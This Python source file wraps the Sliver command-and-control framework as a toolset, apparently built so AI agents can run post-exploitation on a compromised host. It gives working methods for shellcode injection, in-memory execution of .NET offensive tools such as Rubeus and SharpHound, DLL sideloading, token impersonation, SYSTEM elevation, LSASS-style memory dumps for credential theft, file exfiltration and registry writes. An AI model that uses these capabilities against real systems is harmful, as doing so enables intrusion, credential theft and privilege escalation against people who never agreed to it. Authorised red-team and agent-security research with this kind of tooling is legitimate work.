import os
import tempfile
import typing as t
from pathlib import Path

from dreadnode import Config, util
from dreadnode.agents.tools import Toolset, fs, tool_method
from loguru import logger
from sliver import (  # type: ignore[import-untyped]
    InteractiveBeacon,
    InteractiveSession,
    SliverClient,
    SliverClientConfig,
)
from sliver.pb.clientpb import client_pb2  # type: ignore[import-untyped]
from sliver.pb.sliverpb import sliver_pb2  # type: ignore[import-untyped]


class SliverImplant(Toolset):
    """
    A toolset for interacting with a Sliver implant (session or beacon) for post-exploitation.

    Supports both session (interactive/real-time) and beacon (async callback) implant types.
    When the implant is a beacon, commands are submitted as tasks and the toolset waits for results.

    When using this toolset directly (not via an agent), you must use the toolset within an
    async context manager (async with) to initialize the Sliver client.

    Example:
        async with SliverImplant(
            config_file="/home/op/.sliver-client/configs/op.cfg",
            implant_id="abc-123-def",
            implant_type="session",
        ) as implant:
            result = await implant.whoami()
    """

    config_file: str = Config(description="path to Sliver operator config file (.cfg)")
    implant_id: str = Config(description="session or beacon ID to interact with")
    implant_type: str = Config(
        default="session",
        description="implant type: 'session' (real-time) or 'beacon' (async callback)",
    )
    timeout: int = Config(default=60, description="timeout for Sliver gRPC requests in seconds")
    beacon_task_timeout: int = Config(
        default=120, description="timeout waiting for beacon task results in seconds"
    )
    variant: str | None = Config(default="all")
    max_command_response_output: int = Config(
        default=1024**2,
        description="maximum allowable response output size in number of chars",
    )

    _interact: InteractiveSession | InteractiveBeacon

    async def __aenter__(self):
        try:
            config = SliverClientConfig.parse_config_file(Path(self.config_file))
            self._client = SliverClient(config)
            await self._client.connect()

            interact: InteractiveSession | InteractiveBeacon | None
            if self.implant_type == "beacon":
                interact = await self._client.interact_beacon(self.implant_id)
            else:
                interact = await self._client.interact_session(self.implant_id)

            if interact is None:
                msg = (
                    f"Could not interact with {self.implant_type} '{self.implant_id}'. "
                    "Verify the implant ID and that it is active."
                )
                raise RuntimeError(msg)  # noqa: TRY301

            self._interact = interact

        except Exception as e:
            logger.error(f"Failed to connect to Sliver implant: {e}")
            raise RuntimeError(f"Failed to connect to Sliver implant: {e}") from e

        self._local_fs = fs.Filesystem(path="/")
        return self

    async def __aexit__(self, exc_type, exc, tb):
        if exc_type is not None:
            logger.error(f"{exc_type}: {exc}.\n{tb}")

    async def _resolve_result(self, result_or_task: t.Any) -> t.Any:
        """For beacons, commands return awaitable tasks. For sessions, they return results directly."""
        if self.implant_type == "beacon" and callable(getattr(result_or_task, "__await__", None)):
            return await result_or_task
        return result_or_task

    def _truncate(self, output: str) -> str:
        if len(output) > self.max_command_response_output:
            logger.warning(
                f"Output exceeds max size of {self.max_command_response_output} chars. Truncating."
            )
            return util.shorten_string(output, max_length=self.max_command_response_output)
        return output

    # ── File System ──────────────────────────────────────────────────────

    @tool_method(variants=["all"], catch=True)
    async def ls(
        self,
        path: t.Annotated[
            str,
            "Directory path to list. Defaults to the implant's current working directory.",
        ] = ".",
    ) -> str:
        """
        List files and directories at the specified path on the target system.
        """
        result = await self._resolve_result(await self._interact.ls(path))
        entries = []
        for f in result.Files:
            ftype = "d" if f.IsDir else "f"
            entries.append(f"[{ftype}] {f.Name:40s}  {f.Size:>10d} bytes")
        header = f"Path: {result.Path}\n"
        return self._truncate(header + "\n".join(entries))

    @tool_method(variants=["all"], catch=True)
    async def cd(
        self,
        path: t.Annotated[str, "The directory path to change to."],
    ) -> str:
        """
        Change the implant's current working directory on the target system.
        """
        result = await self._resolve_result(await self._interact.cd(path))
        return f"Changed directory to: {result.Path}"

    @tool_method(variants=["all"], catch=True)
    async def pwd(self) -> str:
        """
        Print the implant's current working directory on the target system.
        """
        result = await self._resolve_result(await self._interact.pwd())
        return f"Current directory: {result.Path}"

    @tool_method(variants=["all"], catch=True)
    async def mkdir(
        self,
        path: t.Annotated[str, "Path of the directory to create on the target."],
    ) -> str:
        """
        Create a directory at the specified path on the target system.
        """
        result = await self._resolve_result(await self._interact.mkdir(path))
        return f"Created directory: {result.Path}"

    @tool_method(variants=["all"], catch=True)
    async def rm(
        self,
        path: t.Annotated[str, "Path of the file or directory to remove."],
        *,
        recursive: t.Annotated[bool, "Recursively remove directories."] = False,
        force: t.Annotated[bool, "Force removal without confirmation."] = False,
    ) -> str:
        """
        Remove a file or directory on the target system.
        """
        await self._resolve_result(await self._interact.rm(path, recursive=recursive, force=force))
        return f"Removed: {path}"

    @tool_method(variants=["all"], catch=True)
    async def download(
        self,
        remote_path: t.Annotated[str, "Full path of the file on the target system to download."],
    ) -> str:
        """
        Download a file from the target system. The file data is returned as a confirmation
        with size information. For large files, use download_to_local_file instead.
        """
        result = await self._resolve_result(await self._interact.download(remote_path))
        size_kb = len(result.Data) / 1024
        return f"Downloaded '{remote_path}' ({size_kb:.1f} KB)"

    @tool_method(variants=["all"], catch=True)
    async def download_to_local_file(
        self,
        remote_path: t.Annotated[str, "Full path of the file on the target system to download."],
    ) -> str | dict:
        """
        Download a file from the target system and save it locally.
        Returns the local file path where the downloaded file was saved.
        """
        result = await self._resolve_result(await self._interact.download(remote_path))
        saved = await self._write_tmp_file(
            filename=os.path.basename(remote_path), raw_bytes=result.Data
        )
        return {"name": os.path.basename(saved.name), "path": saved.name}

    @tool_method(variants=["all"], catch=True)
    async def upload(
        self,
        local_path: t.Annotated[str, "Local file path to upload."],
        remote_path: t.Annotated[str, "Destination path on the target system."],
    ) -> str:
        """
        Upload a local file to the target system at the specified remote path.
        """
        with open(local_path, "rb") as f:  # noqa: ASYNC230
            file_data = f.read()
        result = await self._resolve_result(await self._interact.upload(remote_path, file_data))
        return f"Uploaded to {result.Path} ({len(file_data) / 1024:.1f} KB)"

    # ── Execution ────────────────────────────────────────────────────────

    @tool_method(variants=["all"], catch=True)
    async def execute(
        self,
        exe: t.Annotated[str, "Path to the executable to run on the target."],
        args: t.Annotated[list[str] | None, "Command-line arguments for the executable."] = None,
        *,
        output: t.Annotated[bool, "Capture and return stdout/stderr."] = True,
    ) -> str:
        """
        Execute a program on the target system. This runs the binary directly (not through a shell).
        Use the 'shell' command if you need shell features like pipes, redirection, or globbing.
        """
        result = await self._resolve_result(
            await self._interact.execute(exe, args or [], output=output)
        )
        out = result.Stdout.decode(errors="replace") if result.Stdout else ""
        err = result.Stderr.decode(errors="replace") if result.Stderr else ""
        combined = out
        if err:
            combined += f"\n[stderr]\n{err}"
        if not combined.strip():
            combined = f"Command '{exe}' completed with no output (status: {result.Status})"
        return self._truncate(combined)

    @tool_method(variants=["all"], catch=True)
    async def execute_assembly(
        self,
        assembly_path: t.Annotated[str, "Local path to the .NET assembly (.exe/.dll) to execute."],
        arguments: t.Annotated[str, "Command-line arguments for the assembly."] = "",
        *,
        is_dll: t.Annotated[bool, "Whether the assembly is a DLL."] = False,
        arch: t.Annotated[str, "Target architecture: 'x86' or 'x64'."] = "x64",
    ) -> str:
        """
        Execute a .NET assembly in-memory on the target (execute-assembly).
        The assembly is loaded from the local filesystem and executed reflectively in the implant process.
        Useful for running tools like Seatbelt, Rubeus, SharpHound, etc.
        """
        with open(assembly_path, "rb") as f:  # noqa: ASYNC230
            assembly_bytes = f.read()
        result = await self._resolve_result(
            await self._interact.execute_assembly(
                assembly_bytes,
                arguments=arguments,
                process="",
                is_dll=is_dll,
                arch=arch,
                class_name="",
                method="",
                app_domain="",
            )
        )
        out = result.Output.decode(errors="replace") if result.Output else ""
        if not out.strip():
            out = "Assembly executed with no output."
        return self._truncate(out)

    @tool_method(variants=["all"], catch=True)
    async def execute_shellcode(
        self,
        shellcode_path: t.Annotated[str, "Local path to the raw shellcode file."],
        *,
        pid: t.Annotated[int, "Target process ID to inject into. 0 = current process."] = 0,
        rwx: t.Annotated[bool, "Use RWX memory permissions (more detectable)."] = False,
    ) -> str:
        """
        Inject and execute raw shellcode on the target system.
        If pid is 0, executes in the implant's own process.
        """
        with open(shellcode_path, "rb") as f:  # noqa: ASYNC230
            shellcode = f.read()
        await self._resolve_result(
            await self._interact.execute_shellcode(shellcode, rwx=rwx, pid=pid)
        )
        return f"Shellcode injected and executed ({len(shellcode)} bytes, pid={pid})"

    @tool_method(variants=["all"], catch=True)
    async def sideload(
        self,
        dll_path: t.Annotated[str, "Local path to the shared library (DLL/SO/dylib) to sideload."],
        entry_point: t.Annotated[str, "Export function name to call."] = "",
        arguments: t.Annotated[str, "Arguments passed to the entry point."] = "",
        *,
        process_name: t.Annotated[
            str, "Sacrificial process to spawn for loading the library."
        ] = "",
        kill: t.Annotated[bool, "Kill the sacrificial process after execution."] = True,
    ) -> str:
        """
        Load a shared library (DLL/SO/dylib) into a sacrificial process on the target
        and call an exported function. Useful for running unmanaged code or BOFs.
        """
        with open(dll_path, "rb") as f:  # noqa: ASYNC230
            dll_data = f.read()
        result = await self._resolve_result(
            await self._interact.sideload(
                dll_data,
                process_name=process_name,
                arguments=arguments,
                entry_point=entry_point,
                kill=kill,
            )
        )
        out = result.Result.decode(errors="replace") if result.Result else ""
        return self._truncate(out) if out.strip() else "Sideload executed with no output."

    # ── Reconnaissance ───────────────────────────────────────────────────

    @tool_method(variants=["all"], catch=True)
    async def ps(self) -> str:
        """
        List running processes on the target system, including PID, PPID, executable name,
        owner, architecture, and session ID.
        """
        processes = await self._resolve_result(await self._interact.ps())
        lines = [f"{'PID':>7s}  {'PPID':>7s}  {'Owner':20s}  {'Executable'}"]
        lines.extend(f"{p.Pid:7d}  {p.Ppid:7d}  {p.Owner:20s}  {p.Executable}" for p in processes)
        return self._truncate("\n".join(lines))

    @tool_method(variants=["all"], catch=True)
    async def ifconfig(self) -> str:
        """
        List network interfaces and their configuration on the target system.
        """
        result = await self._resolve_result(await self._interact.ifconfig())
        lines = []
        for iface in result.NetInterfaces:
            addrs = ", ".join(iface.IPAddresses) if iface.IPAddresses else "no addresses"
            lines.append(f"{iface.Name}: MAC={iface.MAC}  IPs=[{addrs}]")
        return "\n".join(lines) if lines else "No network interfaces found."

    @tool_method(variants=["all"], catch=True)
    async def netstat(
        self,
        *,
        tcp: t.Annotated[bool, "Show TCP connections."] = True,
        udp: t.Annotated[bool, "Show UDP connections."] = True,
        ipv4: t.Annotated[bool, "Show IPv4 connections."] = True,
        ipv6: t.Annotated[bool, "Show IPv6 connections."] = False,
        listening: t.Annotated[bool, "Show only listening ports."] = True,
    ) -> str:
        """
        Display active network connections and listening ports on the target system.
        """
        result = await self._resolve_result(
            await self._interact.netstat(
                tcp=tcp, udp=udp, ipv4=ipv4, ipv6=ipv6, listening=listening
            )
        )
        lines = [f"{'Protocol':10s}  {'Local Address':30s}  {'Remote Address':30s}  {'State'}"]
        for entry in result.Entries:
            local = f"{entry.LocalAddr.Ip}:{entry.LocalAddr.Port}"
            remote = f"{entry.RemoteAddr.Ip}:{entry.RemoteAddr.Port}" if entry.RemoteAddr else "-"
            lines.append(f"{entry.Protocol:10s}  {local:30s}  {remote:30s}  {entry.SkState}")
        return self._truncate("\n".join(lines))

    @tool_method(variants=["all"], catch=True)
    async def screenshot(self) -> str | dict:
        """
        Capture a screenshot of the target system's current display.
        The screenshot is saved locally and the file path is returned.
        """
        result = await self._resolve_result(await self._interact.screenshot())
        saved = await self._write_tmp_file(filename="screenshot.png", raw_bytes=result.Data)
        return {"name": "screenshot.png", "path": saved.name, "size_kb": len(result.Data) / 1024}

    @tool_method(variants=["all"], catch=True)
    async def terminate_process(
        self,
        pid: t.Annotated[int, "Process ID to terminate."],
        *,
        force: t.Annotated[bool, "Force kill the process."] = False,
    ) -> str:
        """
        Terminate a process on the target system by its PID.
        """
        await self._resolve_result(await self._interact.terminate(pid, force=force))
        return f"Process {pid} terminated."

    @tool_method(variants=["all"], catch=True)
    async def get_env(
        self,
        name: t.Annotated[str, "Environment variable name to retrieve."] = "",
    ) -> str:
        """
        Get environment variable(s) from the target system.
        If name is empty, returns all environment variables.
        """
        result = await self._resolve_result(await self._interact.get_env(name))
        lines = [f"{var.Key}={var.Value}" for var in result.Variables]
        return "\n".join(lines) if lines else "No environment variables found."

    # ── Privilege & Identity ─────────────────────────────────────────────

    @tool_method(variants=["all"], catch=True)
    async def whoami(self) -> str:
        """
        Display the current user context of the implant on the target system
        by executing 'whoami' (or equivalent).
        """
        result = await self._resolve_result(await self._interact.execute("whoami", [], output=True))
        out = result.Stdout.decode(errors="replace").strip() if result.Stdout else ""
        return out or "Could not determine current user."

    @tool_method(variants=["all"], catch=True)
    async def impersonate(
        self,
        username: t.Annotated[str, "The username to impersonate."],
    ) -> str:
        """
        Impersonate a user on the target system (Windows).
        The implant will assume the security context of the specified user.
        """
        await self._resolve_result(await self._interact.impersonate(username))
        return f"Now impersonating: {username}"

    @tool_method(variants=["all"], catch=True)
    async def make_token(
        self,
        username: t.Annotated[str, "Username for the new logon session."],
        password: t.Annotated[str, "Password for the specified user."],
        domain: t.Annotated[str, "Domain for the user account."] = "",
    ) -> str:
        """
        Create a new Windows logon token with the specified credentials (Windows).
        Useful for accessing network resources as another user.
        """
        await self._resolve_result(await self._interact.make_token(username, password, domain))
        user_display = f"{domain}\\{username}" if domain else username
        return f"Created token for: {user_display}"

    @tool_method(variants=["all"], catch=True)
    async def revert_to_self(self) -> str:
        """
        Revert to the implant's original security context, undoing any impersonation
        or token manipulation (Windows).
        """
        await self._resolve_result(await self._interact.revert_to_self())
        return "Reverted to original security context."

    @tool_method(variants=["all"], catch=True)
    async def run_as(
        self,
        username: t.Annotated[str, "Username to run the process as."],
        process_name: t.Annotated[str, "Path to the executable to run."],
        args: t.Annotated[str, "Arguments for the process."] = "",
    ) -> str:
        """
        Start a new process as a different user on the target system (Windows).
        """
        result = await self._resolve_result(
            await self._interact.run_as(username, process_name, args)
        )
        out = result.Output.decode(errors="replace") if result.Output else ""
        return self._truncate(out) if out.strip() else f"Process started as {username}."

    @tool_method(variants=["all"], catch=True)
    async def get_system(self) -> str:
        """
        Attempt to elevate to SYSTEM privileges on the target (Windows).
        Spawns a new Sliver implant session running as NT AUTHORITY\\SYSTEM.
        """
        result = await self._resolve_result(
            await self._interact.get_system(
                hosting_process="",
                config=client_pb2.ImplantConfig(),
            )
        )
        return (
            f"Elevated to SYSTEM. New session: {result.Session.ID if result.Session else 'pending'}"
        )

    # ── Process Injection & Migration ────────────────────────────────────

    @tool_method(variants=["all"], catch=True)
    async def process_dump(
        self,
        pid: t.Annotated[int, "PID of the process to dump memory from."],
    ) -> str | dict:
        """
        Dump the memory of a remote process (e.g. for credential extraction from LSASS).
        The dump is saved locally and the file path is returned.
        """
        result = await self._resolve_result(await self._interact.process_dump(pid))
        saved = await self._write_tmp_file(filename=f"procdump_{pid}.dmp", raw_bytes=result.Data)
        return {
            "name": f"procdump_{pid}.dmp",
            "path": saved.name,
            "size_kb": len(result.Data) / 1024,
        }

    # ── Registry (Windows) ───────────────────────────────────────────────

    @tool_method(variants=["all"], catch=True)
    async def registry_read(
        self,
        hive: t.Annotated[str, "Registry hive (e.g. 'HKLM', 'HKCU', 'HKU')."],
        reg_path: t.Annotated[str, "Registry key path (e.g. 'SOFTWARE\\\\Microsoft\\\\Windows')."],
        key: t.Annotated[str, "Value name to read."],
        hostname: t.Annotated[str, "Remote hostname for remote registry queries."] = "",
    ) -> str:
        """
        Read a value from the Windows registry on the target system.
        """
        result = await self._resolve_result(
            await self._interact.registry_read(hive, reg_path, key, hostname)
        )
        return f"Registry value [{hive}\\{reg_path}\\{key}]: {result.Value}"

    @tool_method(variants=["all"], catch=True)
    async def registry_write(
        self,
        hive: t.Annotated[str, "Registry hive (e.g. 'HKLM', 'HKCU')."],
        reg_path: t.Annotated[str, "Registry key path."],
        key: t.Annotated[str, "Value name to write."],
        string_value: t.Annotated[str, "String value to write."] = "",
        hostname: t.Annotated[str, "Remote hostname for remote registry writes."] = "",
    ) -> str:
        """
        Write a value to the Windows registry on the target system.
        """
        await self._resolve_result(
            await self._interact.registry_write(
                hive,
                reg_path,
                key,
                hostname,
                string_value=string_value,
                byte_value=b"",
                dword_value=0,
                qword_value=0,
                reg_type=sliver_pb2.RegistryType.String,
            )
        )
        return f"Wrote registry value [{hive}\\{reg_path}\\{key}] = {string_value}"

    # ── Utilities ────────────────────────────────────────────────────────

    async def _write_tmp_file(
        self, filename: str, text: str | None = None, raw_bytes: bytes | None = None
    ) -> fs.FilesystemItem:
        """Write content to a temporary file and return the FilesystemItem."""
        if not raw_bytes and not text:
            raise TypeError("File contents (bytes or text) must be supplied.")

        tmp_dir = tempfile.TemporaryDirectory(delete=False)

        if "\\" in filename:
            filename = filename.rsplit("\\", maxsplit=1)[-1]
        elif "/" in filename:
            filename = filename.split("/")[-1]

        fullpath = os.path.join(tmp_dir.name, filename)

        if raw_bytes:
            return await self._local_fs.write_file_bytes(path=fullpath, byte_data=raw_bytes)
        assert text is not None
        return await self._local_fs.write_file(path=fullpath, contents=text)
